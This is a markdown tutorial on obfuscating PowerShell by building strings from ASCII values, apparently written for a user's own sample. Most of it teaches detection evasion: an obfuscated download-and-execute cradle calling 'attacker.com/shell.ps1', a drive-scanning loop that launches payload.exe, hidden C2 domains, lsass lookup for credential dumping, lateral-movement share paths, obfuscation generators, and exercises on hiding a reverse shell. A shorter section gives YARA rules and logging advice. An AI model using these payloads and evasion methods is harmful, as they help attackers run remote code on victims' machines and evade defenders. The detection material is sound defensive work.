# ASCII Enumeration Techniques: Theory & Practice

## Overview
ASCII enumeration is an obfuscation technique that converts numeric ASCII values into characters dynamically, allowing code to hide readable strings and sensitive commands behind numeric ranges.

---

## Part 1: Fundamentals

### What is ASCII?
ASCII (American Standard Code for Information Exchange) is a character encoding standard where each character has a numeric value:

```
'A' = 65    'Z' = 90    'a' = 97    'z' = 122
'0' = 48    '9' = 57    ' ' = 32    ':' = 58
```

### The Core Concept
Instead of writing:
```powershell
$cmd = "cmd.exe"
```

You write:
```powershell
$cmd = [char]99 + [char]109 + [char]100 + [char]46 + [char]101 + [char]120 + [char]101
```

Both evaluate to `"cmd.exe"`, but the second hides the literal string.

---

## Part 2: ASCII Enumeration Methods

### Method 1: Range + ForEach Loop (Your dope_shope example)

**Pattern:**
```powershell
<start_ascii>..<end_ascii> | ForEach-Object { [char]$_ }
```

**Example: Build drive letters D: through Z:**
```powershell
68..90 | ForEach-Object { [char]$_ }
# Output: D E F G H I J K L M N O P Q R S T U V W X Y Z
```

**Why it works:**
- `68..90` generates: 68, 69, 70, 71, ... 90
- `[char]$_` converts each number to its ASCII character
- Result: a sequence of all uppercase letters from D to Z

**Real-world usage (from dope_shope):**
```powershell
68..90 | ForEach-Object {
    $d = [char]$_ + ':'  # Build D:, E:, F:, etc.
    if(Test-Path($d + '\payload.exe')) {
        Start-Process ($d + '\payload.exe')
    }
}
```

**Evasion benefit:** Static analysis tools see "68..90" not "drive letters D-Z"

---

### Method 2: Join Characters

**Pattern:**
```powershell
[char[]](<ascii_array>) -join ''
```

**Example: Build "cmd.exe"**
```powershell
[char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
# Output: cmd.exe
```

**How it works:**
- `@(99, 109, 100, ...)` is an array of ASCII values
- `[char[]]` casts the array to characters
- `-join ''` concatenates them with no separator

**Real-world usage:**
```powershell
$command = [char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
Invoke-Expression $command  # Executes cmd.exe
```

---

### Method 3: Individual Character Concatenation

**Pattern:**
```powershell
[char]<value> + [char]<value> + ...
```

**Example: Build "powershell"**
```powershell
[char]112 + [char]111 + [char]119 + [char]101 + [char]114 + [char]115 + [char]104 + [char]101 + [char]108 + [char]108
# Output: powershell
```

---

### Method 4: Range with String Building (Flexible)

**Pattern:**
```powershell
$result = ''
65..70 | ForEach-Object { $result += [char]$_ }
# Output: ABCDEF
```

**Advanced example: Build multiple words**
```powershell
$result = ''
# 'A' to 'Z'
65..90 | ForEach-Object { $result += [char]$_ }
# Add space
$result += [char]32
# 'a' to 'z'
97..122 | ForEach-Object { $result += [char]$_ }
# Output: ABCDEFGHIJKLMNOPQRSTUVWXYZ abcdefghijklmnopqrstuvwxyz
```

---

## Part 3: Practical Implementation

### Converting Text to ASCII Enumeration

**Step 1: Identify the string**
```
String: "cmd.exe"
```

**Step 2: Get ASCII values**
```
c = 99
m = 109
d = 100
. = 46
e = 101
x = 120
e = 101
```

**Step 3: Choose encoding method**

**Method A (Join):**
```powershell
[char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
```

**Method B (Concatenation):**
```powershell
[char]99 + [char]109 + [char]100 + [char]46 + [char]101 + [char]120 + [char]101
```

**Method C (Loop):**
```powershell
$s = ''; 99, 109, 100, 46, 101, 120, 101 | ForEach-Object { $s += [char]$_ }; $s
```

---

### Practical Payload Example: Hidden Command Execution

**Original (Detectable):**
```powershell
cmd.exe /c "powershell.exe -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")'"
```

**Obfuscated with ASCII enumeration:**
```powershell
$cmd = [char[]]@(99, 109, 100) -join ''  # cmd
$ps = [char[]]@(112, 111, 119, 101, 114, 115, 104, 101, 108, 108) -join ''  # powershell
$url = [char[]]@(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 46, 99, 111, 109) -join ''  # http://attacker.com

& $cmd /c "$ps -Command 'IEX(New-Object Net.WebClient).DownloadString(\"$url/shell.ps1\")'"
```

**Why this is effective:**
- YARA rules looking for "cmd.exe" won't match
- Static analysis sees numeric arrays, not command strings
- String-based detection is bypassed

---

## Part 4: Detection Evasion Applications

### Application 1: Registry Key Obfuscation

**Goal:** Hide registry paths from detection

```powershell
# Original (detectable):
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Obfuscated:
$hklm = [char[]]@(72, 75, 76, 77) -join ''  # HKLM
$path = [char[]]@(83, 111, 102, 116, 119, 97, 114, 101) -join ''  # Software
$regPath = "$hklm`:\$path\Microsoft\Windows\CurrentVersion\Run"
```

### Application 2: Process Name Hiding

```powershell
# Original:
Get-Process | Where-Object {$_.Name -eq "svchost"}

# Obfuscated:
$processName = [char[]]@(115, 118, 99, 104, 111, 115, 116) -join ''  # svchost
Get-Process | Where-Object {$_.Name -eq $processName}
```

### Application 3: File Path Obfuscation

```powershell
# Original:
$payload = Get-Content "C:\Windows\Temp\payload.exe"

# Obfuscated:
$temp = [char[]]@(84, 101, 109, 112) -join ''  # Temp
$payload = Get-Content "C:\Windows\$temp\payload.exe"
```

### Application 4: API Call Obfuscation

```powershell
# Original:
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

# Obfuscated (in C#):
$kernel32 = [char[]]@(107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108) -join ''
[DllImport($kernel32)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
```

---

## Part 5: Advanced Techniques

### Technique 1: Nested Enumeration

Combine multiple ranges to build complex strings:

```powershell
# Build "cmd.exe /c powershell"
$obfuscated = (
    [char[]]@(99, 109, 100) -join '',     # cmd
    [char]32,                              # space
    [char]47,                              # /
    [char]99,                              # c
    [char]32,                              # space
    [char[]]@(112, 111, 119, 101, 114, 115, 104, 101, 108, 108) -join ''  # powershell
) -join ''
```

### Technique 2: XOR + ASCII Enumeration

Combine XOR encoding with ASCII enumeration for deeper obfuscation:

```powershell
# Original payload hidden with XOR key
$xorKey = 0x42
$encoded = @(99, 109, 100) | ForEach-Object { $_ -bxor $xorKey }  # XOR each byte

# Decode and execute
$decoded = $encoded | ForEach-Object { [char]($_ -bxor $xorKey) }
$command = $decoded -join ''
```

### Technique 3: Base64 + ASCII Enumeration

Combine base64 encoding with ASCII obfuscation:

```powershell
# Encode: "cmd.exe" → base64 → ASCII values
$base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("cmd.exe"))
$ascii_vals = [char[]]$base64 | ForEach-Object { [int][char]$_ }

# Hide the base64 decoder too:
$decoder = [char[]]@(84, 101, 120, 116, 46, 69, 110, 99, 111, 100, 105, 110, 103) -join ''  # Text.Encoding
# Decode at runtime
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
```

---

## Part 6: Detection Engineering

### Detection Rule 1: Pattern-Based Detection

**Detectable pattern:** Numeric arrays being converted to characters

```yara
rule Suspicious_ASCII_Enumeration {
    strings:
        $pattern1 = "[char[]]@(" nocase
        $pattern2 = "[char[]](" nocase
        $pattern3 = "| ForEach-Object { [char]" nocase
        $pattern4 = "-join ''" nocase
    condition:
        all of them
}
```

### Detection Rule 2: Behavioral Detection

Monitor PowerShell execution for:
1. Large numeric arrays in scripts
2. Frequent `[char]` casting operations
3. String concatenation from numeric values
4. Arrays with 50+ elements being converted to strings

### Detection Rule 3: Log-Based Detection

```powershell
# PowerShell Operational Log (Event ID 4104)
# Look for patterns:
# - "..| ForEach" OR "..| %" (range + loop)
# - "[char]" appearing 5+ times in single script block
# - "@(" with numeric-only content
```

---

## Part 7: Use Cases in Red Teaming

### Use Case 1: Initial Access Payload (Your dope_shope example)
```powershell
# Hide drive enumeration logic
68..90 | ForEach-Object {
    $drive = [char]$_ + ':'
    if(Test-Path($drive + '\payload.exe')) {
        Start-Process ($drive + '\payload.exe')
    }
}
```

### Use Case 2: C2 Communication
```powershell
# Hide C2 domain
$c2 = [char[]]@(97, 116, 116, 97, 99, 107, 101, 114, 46, 99, 111, 109) -join ''
$url = [char[]]@(104, 116, 116, 112, 58, 47, 47) -join '' + $c2
```

### Use Case 3: Credential Harvesting
```powershell
# Hide registry paths used for credential dumping
$lsass = [char[]]@(76, 83, 65, 83, 83) -join ''
Get-Process | Where-Object { $_.Name -eq $lsass }
```

### Use Case 4: Lateral Movement
```powershell
# Hide remote service paths
$admin_share = [char[]]@(92, 92) -join '' + $target + [char[]]@(92, 65, 68, 77, 73, 36) -join ''
```

---

## Part 8: Tools & Automation

### PowerShell Function: String to ASCII Converter

```powershell
function Convert-StringToASCII {
    param([string]$String)
    
    $ascii_values = [char[]]$String | ForEach-Object { [int][char]$_ }
    
    # Output as array format
    Write-Output "[char[]]@($($ascii_values -join ', ')) -join ''"
    
    # Also output as range format (if consecutive)
    Write-Output "ASCII Values: $($ascii_values -join ', ')"
}

# Usage:
Convert-StringToASCII "cmd.exe"
# Output: [char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
# ASCII Values: 99, 109, 100, 46, 101, 120, 101
```

### Python Script: ASCII Enumeration Generator

```python
def string_to_ascii_enum(text, method="join"):
    """Convert string to ASCII enumeration PowerShell code"""
    ascii_values = [str(ord(c)) for c in text]
    
    if method == "join":
        return f"[char[]]@({', '.join(ascii_values)}) -join ''"
    elif method == "concat":
        return " + ".join([f"[char]{val}" for val in ascii_values])
    elif method == "loop":
        values = ", ".join(ascii_values)
        return f"$s = ''; {values} | ForEach-Object {{ $s += [char]$_ }}; $s"
    
    return None

# Usage:
print(string_to_ascii_enum("payload.exe", "join"))
# Output: [char[]]@(112, 97, 121, 108, 111, 97, 100, 46, 101, 120, 101) -join ''
```

---

## Part 9: Defensive Recommendations

### Recommendation 1: Block Suspicious Patterns
```powershell
# GPO/AppLocker rule to block scripts with:
# - "[char[]]@(" patterns
# - Numeric arrays 50+ elements
# - Multiple [char] casts in single script
```

### Recommendation 2: Monitor Execution Context
```powershell
# Enable PowerShell logging at DEBUG level:
# - Event 4104 (Script Block Logging)
# - Event 4688 (Process Creation)
# Monitor for scripts with numeric obfuscation patterns
```

### Recommendation 3: Behavioral Analysis
```
Alert on:
1. PowerShell building strings from numbers
2. Accessing registry with obfuscated paths
3. Spawning child processes from obfuscated command strings
4. Network connections to obfuscated domains
```

---

## Summary Table: ASCII Enumeration Methods

| Method | Syntax | Evasion | Readability | Performance |
|--------|--------|---------|-------------|-------------|
| **Range + ForEach** | `65..90\|%{[char]$_}` | High | Low | Good |
| **Array + Join** | `[char[]]@(65,66,67)-join''` | High | Medium | Good |
| **Concatenation** | `[char]65+[char]66` | Medium | Low | Poor (many + ops) |
| **Loop Building** | `$s='';65,66\|%{$s+=[char]$_}` | High | Low | Poor |

---

## References & Further Learning

1. **MITRE ATT&CK:**
   - T1027 - Obfuscated Files or Information
   - T1059.001 - Command and Scripting Interpreter: PowerShell

2. **Detection Engineering:**
   - Elastic Common Signals: PowerShell character encoding
   - Splunk: Detection for obfuscated PowerShell

3. **Research Papers:**
   - "Living off the Land: A Minimal Malware" (practical evasion techniques)
   - PowerShell security research from Microsoft's Threat Intelligence team

---

## Practice Exercises

### Exercise 1: Obfuscate a Malware Command
Take a malicious command and convert 3 key strings using ASCII enumeration:
```
Original: cmd.exe /c "powershell.exe -Command Get-ChildItem"
Task: Obfuscate cmd.exe, powershell.exe, and Get-ChildItem
```

### Exercise 2: Detection Challenge
Write a detection rule (YARA/Splunk/Elastic) that catches ASCII enumeration patterns while minimizing false positives.

### Exercise 3: Advanced Evasion
Combine ASCII enumeration with base64 encoding to hide a reverse shell command.

---

## Conclusion

ASCII enumeration is a **fundamental obfuscation technique** in offensive security that:
- Hides literal strings from static analysis
- Bypasses simple keyword-based detection
- Works across all PowerShell environments
- Combines well with other obfuscation methods

Mastering it is essential for payload development, detection evasion, and understanding modern malware techniques.